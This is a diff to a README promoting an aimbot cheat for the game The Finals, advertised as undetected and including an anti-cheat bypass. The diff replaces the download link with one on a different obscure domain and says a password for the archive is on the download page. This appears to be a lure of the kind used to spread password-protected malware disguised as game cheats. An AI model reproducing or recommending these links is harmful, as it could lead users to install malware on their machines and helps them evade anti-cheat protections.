@@ -18,7 +18,7 @@ The Finals Aimbot - undetected cheat tool. Anti-cheat bypass included. Works wit
 
 ## Download
 
-[![Download v2.7.0](https://img.shields.io/badge/Download_v2.7.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/finalsaimbot2)
+[![Download v2.7.0](https://img.shields.io/badge/Download_v2.7.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/finalsaimbot2)
 
 > The archive password is shown on the download page.
 
